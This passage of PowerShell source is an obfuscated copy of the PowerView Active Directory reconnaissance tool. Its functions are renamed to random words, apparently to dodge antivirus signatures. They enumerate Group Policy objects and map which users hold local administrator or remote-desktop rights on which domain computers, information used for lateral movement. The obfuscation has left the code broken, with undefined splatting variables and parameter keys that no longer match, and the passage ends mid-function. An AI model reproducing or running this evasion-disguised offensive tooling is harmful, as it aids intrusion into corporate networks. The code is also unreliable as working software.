                    $aJJGHudX99 = sensationalist @SearcherArguments -HyjxYAeb99 | Select-Object -First 1
                    if(-not $aJJGHudX99) {
                        Write-Verbose "[adolescents] Computer '$OoANhkqg99' not found!"
                    }
                    $HfJKdMKz99 = $aJJGHudX99.distinguishedname
                    $RkkOlRkn99 = $aJJGHudX99.dnshostname
                }
                else {
                    $sMQTvMNR99['Identity'] = $DGKWisJq99
                    $User = threatened @SearcherArguments -HyjxYAeb99 | Select-Object -First 1
                    if(-not $User) {
                        Write-Verbose "[adolescents] User '$DGKWisJq99' not found!"
                    }
                    $HfJKdMKz99 = $User.distinguishedname
                }
                $NdavedLY99 = @()
                $NdavedLY99 += $HfJKdMKz99.split(',') | ForEach-Object {
                    if($_.startswith('OU=')) {
                        $HfJKdMKz99.SubString($HfJKdMKz99.IndexOf("$($_),"))
                    }
                }
                Write-Verbose "[adolescents] object OUs: $NdavedLY99"
                if ($NdavedLY99) {
                    $sMQTvMNR99.Remove('Properties')
                    $CcsssNGX99 = $False
                    ForEach($BKvABSFf99 in $NdavedLY99) {
                        $sMQTvMNR99['Identity'] = $BKvABSFf99
                        $FygKDmRG99 += joyridden @SearcherArguments | ForEach-Object {
                            if ($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $Parts = $_.split(';')
                                        $GpoDN = $Parts[0]
                                        $meihHLaf99 = $Parts[1]
                                        if ($CcsssNGX99) {
                                            if ($meihHLaf99 -eq 2) {
                                                $GpoDN
                                            }
                                        }
                                        else {
                                            $GpoDN
                                        }
                                    }
                                }
                            }
                            if ($_.gpoptions -eq 1) {
                                $CcsssNGX99 = $True
                            }
                        }
                    }
                }
                if ($RkkOlRkn99) {
                    $zIbUjceV99 = (lambs -FRrsCtDf99 $RkkOlRkn99).SiteName
                    if($zIbUjceV99 -and ($zIbUjceV99 -notlike 'Error*')) {
                        $sMQTvMNR99['Identity'] = $zIbUjceV99
                        $FygKDmRG99 += foundling @SearcherArguments | ForEach-Object {
                            if($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }
                $mNvuZfhI99 = $HfJKdMKz99.SubString($HfJKdMKz99.IndexOf('DC='))
                $sMQTvMNR99.Remove('Identity')
                $sMQTvMNR99.Remove('Properties')
                $sMQTvMNR99['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$mNvuZfhI99)"
                $FygKDmRG99 += great @SearcherArguments | ForEach-Object {
                    if($_.gplink) {
                        $_.gplink.split('][') | ForEach-Object {
                            if ($_.startswith('LDAP')) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                Write-Verbose "[adolescents] GPOAdsPaths: $FygKDmRG99"
                if ($AFsRDrHH99) { $sMQTvMNR99['Properties'] = $AFsRDrHH99 }
                else { $sMQTvMNR99.Remove('Properties') }
                $sMQTvMNR99.Remove('Identity')
                $FygKDmRG99 | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
                    $sMQTvMNR99['SearchBase'] = $_
                    $sMQTvMNR99['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
                    great @SearcherArguments | ForEach-Object {
                        if ($PSBoundParameters['Raw']) {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                        }
                        $_
                    }
                }
            }
            else {
                $UztPqXyf99 = ''
                $bNYXjnRz99 = ''
                $soGjewdO99 | Where-Object {$_} | ForEach-Object {
                    $hDkTAaiv99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($hDkTAaiv99 -match 'LDAP://|^CN=.*') {
                        $UztPqXyf99 += "(distinguishedname=$hDkTAaiv99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $CBPYVhlj99 = $hDkTAaiv99.SubString($hDkTAaiv99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[adolescents] Extracted domain '$CBPYVhlj99' from '$hDkTAaiv99'"
                            $sMQTvMNR99['Domain'] = $CBPYVhlj99
                            $vBiUoQqq99 = bleachers @SearcherArguments
                            if (-not $vBiUoQqq99) {
                                Write-Warning "[adolescents] Unable to retrieve domain searcher for '$CBPYVhlj99'"
                            }
                        }
                    }
                    elseif ($hDkTAaiv99 -match '{.*}') {
                        $UztPqXyf99 += "(name=$hDkTAaiv99)"
                    }
                    else {
                        try {
                            $ouzLqIgS99 = (-Join (([Guid]$hDkTAaiv99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                            $UztPqXyf99 += "(objectguid=$ouzLqIgS99)"
                        }
                        catch {
                            $UztPqXyf99 += "(displayname=$hDkTAaiv99)"
                        }
                    }
                }
                if ($UztPqXyf99 -and ($UztPqXyf99.Trim() -ne '') ) {
                    $bNYXjnRz99 += "(|$UztPqXyf99)"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[adolescents] Using additional LDAP filter: $WmhkcxXr99"
                    $bNYXjnRz99 += "$WmhkcxXr99"
                }
                $vBiUoQqq99.filter = "(&(objectCategory=groupPolicyContainer)$bNYXjnRz99)"
                Write-Verbose "[adolescents] filter string: $($vBiUoQqq99.filter)"
                if ($PSBoundParameters['FindOne']) { $mKhNNgkp99 = $vBiUoQqq99.FindOne() }
                else { $mKhNNgkp99 = $vBiUoQqq99.FindAll() }
                $mKhNNgkp99 | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        $GPO = $_
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                    }
                    else {
                        if ($PSBoundParameters['SearchBase'] -and ($nedSgaYy99 -Match '^GC://')) {
                            $GPO = Johnson -rtPnFfWd99 $_.Properties
                            try {
                                $GPODN = $GPO.distinguishedname
                                $hMRWoFgI99 = $GPODN.SubString($GPODN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                $bOOnXOnz99 = "\\$hMRWoFgI99\SysVol\$hMRWoFgI99\Policies\$($GPO.cn)"
                                $GPO | Add-Member Noteproperty 'gpcfilesyspath' $bOOnXOnz99
                            }
                            catch {
                                Write-Verbose "[adolescents] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)"
                            }
                        }
                        else {
                            $GPO = Johnson -rtPnFfWd99 $_.Properties
                        }
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                    }
                    $GPO
                }
                if ($mKhNNgkp99) {
                    try { $mKhNNgkp99.dispose() }
                    catch {
                        Write-Verbose "[adolescents] Error disposing of the Results object: $_"
                    }
                }
                $vBiUoQqq99.dispose()
            }
        }
    }
}
function forthwith {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $soGjewdO99,
        [Switch]
        $gfIguNor99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $sMQTvMNR99 = @{}
        if ($PSBoundParameters['Domain']) { $sMQTvMNR99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['LDAPFilter']) { $sMQTvMNR99['LDAPFilter'] = $UtXBFQsM99 }
        if ($PSBoundParameters['SearchBase']) { $sMQTvMNR99['SearchBase'] = $nedSgaYy99 }
        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $sMQTvMNR99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $sMQTvMNR99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
        $LZxUZArx99 = @{}
        if ($PSBoundParameters['Domain']) { $LZxUZArx99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['Server']) { $LZxUZArx99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['Credential']) { $LZxUZArx99['Credential'] = $fxunRYJT99 }
        $qGzKMIqA99 = [System.StringSplitOptions]::RemoveEmptyEntries
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $sMQTvMNR99['Identity'] = $soGjewdO99 }
        adolescents @SearcherArguments | ForEach-Object {
            $JWCFQNmG99 = $_.displayname
            $dpkbnzUO99 = $_.name
            $HuVXciBc99 = $_.gpcfilesyspath
            $roDyzZJY99 =  @{ 'GptTmplPath' = "$HuVXciBc99\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
            if ($PSBoundParameters['Credential']) { $roDyzZJY99['Credential'] = $fxunRYJT99 }
            $Inf = Swahili @ParseArgs
            if ($Inf -and ($Inf.psbase.Keys -contains 'Group Membership')) {
                $xHxyySIT99 = @{}
                ForEach ($yAmtGGWj99 in $Inf.'Group Membership'.GetEnumerator()) {
                    $Group, $UgiJOgNW99 = $yAmtGGWj99.Key.Split('__', $qGzKMIqA99) | ForEach-Object {$_.Trim()}
                    $ACkhHaVG99 = $yAmtGGWj99.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}
                    if ($PSBoundParameters['ResolveMembersToSIDs']) {
                        $PvMPKLlT99 = @()
                        ForEach ($pWTNPYLI99 in $ACkhHaVG99) {
                            if ($pWTNPYLI99 -and ($pWTNPYLI99.Trim() -ne '')) {
                                if ($pWTNPYLI99 -notmatch '^S-1-.*') {
                                    $VJULdqKF99 = @{'ObjectName' = $pWTNPYLI99}
                                    if ($PSBoundParameters['Domain']) { $VJULdqKF99['Domain'] = $UtXBFQsM99 }
                                    $ashraYEA99 = secedes @ConvertToArguments
                                    if ($ashraYEA99) {
                                        $PvMPKLlT99 += $ashraYEA99
                                    }
                                    else {
                                        $PvMPKLlT99 += $pWTNPYLI99
                                    }
                                }
                                else {
                                    $PvMPKLlT99 += $pWTNPYLI99
                                }
                            }
                        }
                        $ACkhHaVG99 = $PvMPKLlT99
                    }
                    if (-not $xHxyySIT99[$Group]) {
                        $xHxyySIT99[$Group] = @{}
                    }
                    if ($ACkhHaVG99 -isnot [System.Array]) {$ACkhHaVG99 = @($ACkhHaVG99)}
                    $xHxyySIT99[$Group].Add($UgiJOgNW99, $ACkhHaVG99)
                }
                ForEach ($yAmtGGWj99 in $xHxyySIT99.GetEnumerator()) {
                    if ($yAmtGGWj99 -and $yAmtGGWj99.Key -and ($yAmtGGWj99.Key -match '^\*')) {
                        $aFyvxhjk99 = $yAmtGGWj99.Key.Trim('*')
                        if ($aFyvxhjk99 -and ($aFyvxhjk99.Trim() -ne '')) {
                            $YGzKEtMK99 = dotcom -ObjectSID $aFyvxhjk99 @ConvertArguments
                        }
                        else {
                            $YGzKEtMK99 = $False
                        }
                    }
                    else {
                        $YGzKEtMK99 = $yAmtGGWj99.Key
                        if ($YGzKEtMK99 -and ($YGzKEtMK99.Trim() -ne '')) {
                            if ($YGzKEtMK99 -match 'Administrators') {
                                $aFyvxhjk99 = 'S-1-5-32-544'
                            }
                            elseif ($YGzKEtMK99 -match 'Remote Desktop') {
                                $aFyvxhjk99 = 'S-1-5-32-555'
                            }
                            elseif ($YGzKEtMK99 -match 'Guests') {
                                $aFyvxhjk99 = 'S-1-5-32-546'
                            }
                            elseif ($YGzKEtMK99.Trim() -ne '') {
                                $VJULdqKF99 = @{'ObjectName' = $YGzKEtMK99}
                                if ($PSBoundParameters['Domain']) { $VJULdqKF99['Domain'] = $UtXBFQsM99 }
                                $aFyvxhjk99 = secedes @ConvertToArguments
                            }
                            else {
                                $aFyvxhjk99 = $Null
                            }
                        }
                    }
                    $KKPPdxkT99 = New-Object PSObject
                    $KKPPdxkT99 | Add-Member Noteproperty 'GPODisplayName' $JWCFQNmG99
                    $KKPPdxkT99 | Add-Member Noteproperty 'GPOName' $dpkbnzUO99
                    $KKPPdxkT99 | Add-Member Noteproperty 'GPOPath' $HuVXciBc99
                    $KKPPdxkT99 | Add-Member Noteproperty 'GPOType' 'RestrictedGroups'
                    $KKPPdxkT99 | Add-Member Noteproperty 'Filters' $Null
                    $KKPPdxkT99 | Add-Member Noteproperty 'GroupName' $YGzKEtMK99
                    $KKPPdxkT99 | Add-Member Noteproperty 'GroupSID' $aFyvxhjk99
                    $KKPPdxkT99 | Add-Member Noteproperty 'GroupMemberOf' $yAmtGGWj99.Value.Memberof
                    $KKPPdxkT99 | Add-Member Noteproperty 'GroupMembers' $yAmtGGWj99.Value.Members
                    $KKPPdxkT99.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                    $KKPPdxkT99
                }
            }
            $roDyzZJY99 =  @{
                'GroupsXMLpath' = "$HuVXciBc99\MACHINE\Preferences\Groups\Groups.xml"
            }
            articulating @ParseArgs | ForEach-Object {
                if ($PSBoundParameters['ResolveMembersToSIDs']) {
                    $PvMPKLlT99 = @()
                    ForEach ($pWTNPYLI99 in $_.GroupMembers) {
                        if ($pWTNPYLI99 -and ($pWTNPYLI99.Trim() -ne '')) {
                            if ($pWTNPYLI99 -notmatch '^S-1-.*') {
                                $VJULdqKF99 = @{'ObjectName' = $YGzKEtMK99}
                                if ($PSBoundParameters['Domain']) { $VJULdqKF99['Domain'] = $UtXBFQsM99 }
                                $ashraYEA99 = secedes -UtXBFQsM99 $UtXBFQsM99 -NUBJRpba99 $pWTNPYLI99
                                if ($ashraYEA99) {
                                    $PvMPKLlT99 += $ashraYEA99
                                }
                                else {
                                    $PvMPKLlT99 += $pWTNPYLI99
                                }
                            }
                            else {
                                $PvMPKLlT99 += $pWTNPYLI99
                            }
                        }
                    }
                    $_.GroupMembers = $PvMPKLlT99
                }
                $_ | Add-Member Noteproperty 'GPODisplayName' $JWCFQNmG99
                $_ | Add-Member Noteproperty 'GPOName' $dpkbnzUO99
                $_ | Add-Member Noteproperty 'GPOType' 'GroupPolicyPreferences'
                $_.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                $_
            }
        }
    }
}
function parka {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $soGjewdO99,
        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $vGsXhFTL99 = 'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $yCkTgUQX99 = @{}
        if ($PSBoundParameters['Domain']) { $yCkTgUQX99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['Server']) { $yCkTgUQX99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $yCkTgUQX99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $yCkTgUQX99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $yCkTgUQX99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $yCkTgUQX99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $yCkTgUQX99['Credential'] = $fxunRYJT99 }
    }
    PROCESS {
        $IaUXhOSw99 = @()
        if ($PSBoundParameters['Identity']) {
            $IaUXhOSw99 += great @CommonArguments -soGjewdO99 $soGjewdO99 | Select-Object -Expand objectsid
            $bDxDKCIX99 = $IaUXhOSw99
            if (-not $IaUXhOSw99) {
                Throw "[parka] Unable to retrieve SID for identity '$soGjewdO99'"
            }
        }
        else {
            $IaUXhOSw99 = @('*')
        }
        if ($vGsXhFTL99 -match 'S-1-5') {
            $CqnTlErg99 = $vGsXhFTL99
        }
        elseif ($vGsXhFTL99 -match 'Admin') {
            $CqnTlErg99 = 'S-1-5-32-544'
        }
        else {
            $CqnTlErg99 = 'S-1-5-32-555'
        }
        if ($IaUXhOSw99[0] -ne '*') {
            ForEach ($vUyIbYgw99 in $IaUXhOSw99) {
                Write-Verbose "[parka] Enumerating nested group memberships for: '$vUyIbYgw99'"
                $IaUXhOSw99 += padlocks @CommonArguments -rtPnFfWd99 'objectsid' -YYXFGcar99 $vUyIbYgw99 | Select-Object -ExpandProperty objectsid
            }
        }
        Write-Verbose "[parka] Target localgroup SID: $CqnTlErg99"
        Write-Verbose "[parka] Effective target domain SIDs: $IaUXhOSw99"
        $EBaAPaOI99 = forthwith @CommonArguments -gfIguNor99 | ForEach-Object {
            $KKPPdxkT99 = $_
            if ($KKPPdxkT99.GroupSID -match $CqnTlErg99) {
                $KKPPdxkT99.GroupMembers | Where-Object {$_} | ForEach-Object {
                    if ( ($IaUXhOSw99[0] -eq '*') -or ($IaUXhOSw99 -Contains $_) ) {
                        $KKPPdxkT99
                    }
                }
            }
            if ( ($KKPPdxkT99.GroupMemberOf -contains $CqnTlErg99) ) {
                if ( ($IaUXhOSw99[0] -eq '*') -or ($IaUXhOSw99 -Contains $KKPPdxkT99.GroupSID) ) {
                    $KKPPdxkT99
                }
            }
        } | Sort-Object -Property GPOName -Unique
        $EBaAPaOI99 | Where-Object {$_} | ForEach-Object {
            $dpkbnzUO99 = $_.GPODisplayName
            $DtOjpZOl99 = $_.GPOName
            $HuVXciBc99 = $_.GPOPath
            $dzOFWhsO99 = $_.GPOType
            if ($_.GroupMembers) {
                $WcKySktl99 = $_.GroupMembers
            }
            else {
                $WcKySktl99 = $_.GroupSID
            }
            $CexMpdpZ99 = $_.Filters
            if ($IaUXhOSw99[0] -eq '*') {
                $kOoLZrUC99 = $WcKySktl99
            }
            else {
                $kOoLZrUC99 = $bDxDKCIX99
            }
            joyridden @CommonArguments -Raw -rtPnFfWd99 'name,distinguishedname' -yrogLtqA99 $DtOjpZOl99 | ForEach-Object {
                if ($CexMpdpZ99) {
                    $mePndRZO99 = sensationalist @CommonArguments -rtPnFfWd99 'dnshostname,distinguishedname' -nedSgaYy99 $_.Path | Where-Object {$_.distinguishedname -match ($CexMpdpZ99.Value)} | Select-Object -ExpandProperty dnshostname
                }
                else {
                    $mePndRZO99 = sensationalist @CommonArguments -rtPnFfWd99 'dnshostname' -nedSgaYy99 $_.Path | Select-Object -ExpandProperty dnshostname
                }
                if ($mePndRZO99) {
                    if ($mePndRZO99 -isnot [System.Array]) {$mePndRZO99 = @($mePndRZO99)}
                    ForEach ($vUyIbYgw99 in $kOoLZrUC99) {
                        $Object = great @CommonArguments -soGjewdO99 $vUyIbYgw99 -rtPnFfWd99 'samaccounttype,samaccountname,distinguishedname,objectsid'
                        $sfwZChzf99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
                        $XDbOixdg99 = New-Object PSObject
                        $XDbOixdg99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $XDbOixdg99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $XDbOixdg99 | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                        $XDbOixdg99 | Add-Member Noteproperty 'Domain' $UtXBFQsM99
                        $XDbOixdg99 | Add-Member Noteproperty 'IsGroup' $sfwZChzf99
                        $XDbOixdg99 | Add-Member Noteproperty 'GPODisplayName' $dpkbnzUO99
                        $XDbOixdg99 | Add-Member Noteproperty 'GPOGuid' $DtOjpZOl99
                        $XDbOixdg99 | Add-Member Noteproperty 'GPOPath' $HuVXciBc99
                        $XDbOixdg99 | Add-Member Noteproperty 'GPOType' $dzOFWhsO99
                        $XDbOixdg99 | Add-Member Noteproperty 'ContainerName' $_.Properties.distinguishedname
                        $XDbOixdg99 | Add-Member Noteproperty 'ComputerName' $mePndRZO99
                        $XDbOixdg99.PSObject.TypeNames.Insert(0, 'PowerView.GPOLocalGroupMapping')
                        $XDbOixdg99
                    }
                }
            }
            foundling @CommonArguments -rtPnFfWd99 'siteobjectbl,distinguishedname' -yrogLtqA99 $DtOjpZOl99 | ForEach-Object {
                ForEach ($vUyIbYgw99 in $kOoLZrUC99) {
                    $Object = great @CommonArguments -soGjewdO99 $vUyIbYgw99 -rtPnFfWd99 'samaccounttype,samaccountname,distinguishedname,objectsid'
                    $sfwZChzf99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
                    $XDbOixdg99 = New-Object PSObject
                    $XDbOixdg99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                    $XDbOixdg99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                    $XDbOixdg99 | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                    $XDbOixdg99 | Add-Member Noteproperty 'IsGroup' $sfwZChzf99
                    $XDbOixdg99 | Add-Member Noteproperty 'Domain' $UtXBFQsM99
                    $XDbOixdg99 | Add-Member Noteproperty 'GPODisplayName' $dpkbnzUO99
                    $XDbOixdg99 | Add-Member Noteproperty 'GPOGuid' $DtOjpZOl99
                    $XDbOixdg99 | Add-Member Noteproperty 'GPOPath' $HuVXciBc99
                    $XDbOixdg99 | Add-Member Noteproperty 'GPOType' $dzOFWhsO99
                    $XDbOixdg99 | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                    $XDbOixdg99 | Add-Member Noteproperty 'ComputerName' $_.siteobjectbl
                    $XDbOixdg99.PSObject.TypeNames.Add('PowerView.GPOLocalGroupMapping')
                    $XDbOixdg99
                }
            }
        }
    }
}
function elides {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $OoANhkqg99,
        [Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        $jeQbaADP99,
        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $vGsXhFTL99 = 'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $yCkTgUQX99 = @{}
        if ($PSBoundParameters['Domain']) { $yCkTgUQX99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['Server']) { $yCkTgUQX99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $yCkTgUQX99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $yCkTgUQX99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $yCkTgUQX99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $yCkTgUQX99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $yCkTgUQX99['Credential'] = $fxunRYJT99 }
    }
    PROCESS {
        if ($PSBoundParameters['ComputerIdentity']) {
            $YYqvItFQ99 = sensationalist @CommonArguments -soGjewdO99 $OoANhkqg99 -rtPnFfWd99 'distinguishedname,dnshostname'
            if (-not $YYqvItFQ99) {
                throw "[elides] Computer $OoANhkqg99 not found. Try a fully qualified host name."
            }
            ForEach ($aJJGHudX99 in $YYqvItFQ99) {
                $aIxvSpLg99 = @()
                $DN = $aJJGHudX99.distinguishedname
                $oRgvREGe99 = $DN.IndexOf('OU=')
                if ($oRgvREGe99 -gt 0) {
                    $GxfRNpES99 = $DN.SubString($oRgvREGe99)
                }
                if ($GxfRNpES99) {
                    $aIxvSpLg99 += joyridden @CommonArguments -nedSgaYy99 $GxfRNpES99 -WmhkcxXr99 '(gplink=*)' | ForEach-Object {
                        Select-String -XhUYaBAP99 $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }
                Write-Verbose "Enumerating the sitename for: $($aJJGHudX99.dnshostname)"
                $zIbUjceV99 = (lambs -FRrsCtDf99 $aJJGHudX99.dnshostname).SiteName
                if ($zIbUjceV99 -and ($zIbUjceV99 -notmatch 'Error')) {
                    $aIxvSpLg99 += foundling @CommonArguments -soGjewdO99 $zIbUjceV99 -WmhkcxXr99 '(gplink=*)' | ForEach-Object {
                        Select-String -XhUYaBAP99 $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }
                $aIxvSpLg99 | forthwith @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
                    $KKPPdxkT99 = $_
                    if($KKPPdxkT99.GroupMembers) {
                        $WcKySktl99 = $KKPPdxkT99.GroupMembers
                    }
                    else {
                        $WcKySktl99 = $KKPPdxkT99.GroupSID
                    }
                    $WcKySktl99 | ForEach-Object {
                        $Object = great @CommonArguments -soGjewdO99 $_
                        $sfwZChzf99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
                        $kGEQrgQq99 = New-Object PSObject
                        $kGEQrgQq99 | Add-Member Noteproperty 'ComputerName' $aJJGHudX99.dnshostname
                        $kGEQrgQq99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $kGEQrgQq99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $kGEQrgQq99 | Add-Member Noteproperty 'ObjectSID' $_
                        $kGEQrgQq99 | Add-Member Noteproperty 'IsGroup' $sfwZChzf99
                        $kGEQrgQq99 | Add-Member Noteproperty 'GPODisplayName' $KKPPdxkT99.GPODisplayName
                        $kGEQrgQq99 | Add-Member Noteproperty 'GPOGuid' $KKPPdxkT99.GPOName
                        $kGEQrgQq99 | Add-Member Noteproperty 'GPOPath' $KKPPdxkT99.GPOPath
                        $kGEQrgQq99 | Add-Member Noteproperty 'GPOType' $KKPPdxkT99.GPOType
                        $kGEQrgQq99.PSObject.TypeNames.Add('PowerView.GPOComputerLocalGroupMember')
                        $kGEQrgQq99
                    }
                }
            }
        }
    }
}
function throng {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Source', 'Name')]
        [String]
        $MrKCsAsv99 = 'Domain',
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
